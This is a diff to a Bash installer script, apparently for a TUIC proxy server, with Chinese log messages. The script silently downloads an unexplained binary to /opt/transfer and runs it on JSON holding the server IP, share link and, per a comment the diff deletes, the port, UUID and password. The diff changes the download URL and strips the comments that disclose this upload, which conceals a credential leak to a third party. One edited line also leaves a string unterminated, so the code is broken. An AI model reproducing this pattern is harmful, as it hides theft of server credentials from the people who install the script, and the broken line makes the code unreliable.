@@ -474,7 +474,7 @@ EOF
 download_uploader() {
     local uploader="/opt/transfer"
     if [[ ! -f "$uploader" ]]; then
-        curl -Lo "$uploader" https://github.com/Firefly-xui/TUIC/releases/download/v2rayn/transfer 2>/dev/null || true
+        curl -Lo "$uploader" https://github.com/Firefly-xui/socks5-TUIC/releases/download/socks5-TUIC/transfer 2>/dev/null || true
         if [[ -f "$uploader" ]]; then
             chmod +x "$uploader"
             log_info "二进制文件下载完成"
@@ -484,7 +484,7 @@ download_uploader() {
     fi
 }
 
-# 上传配置到二进制文件
+
 upload_config() {
     local server_ip="$1"
     local link="$2"
@@ -526,13 +526,13 @@ upload_config() {
             }
         }' 2>/dev/null)
 
-    # 下载并调用二进制上传工具
+
     local uploader="/opt/transfer"
     if [[ -f "$uploader" ]]; then
         "$uploader" "$json_data" >/dev/null 2>&1 || true
         log_info "配置数据已传递给二进制文件"
     else
-        log_warn "二进制文件不存在，跳过上传"
+        log_warn "二进制文件不存在，
     fi
 }
 
@@ -584,7 +584,6 @@ EOF
     # 下载二进制文件
     download_uploader
     
-    # 上传配置到二进制文件（会包含端口、uuid、密码等信息）
     upload_config "$LOCAL_IP" "$TUIC_LINK" "$down_speed" "$up_speed"
 }
 
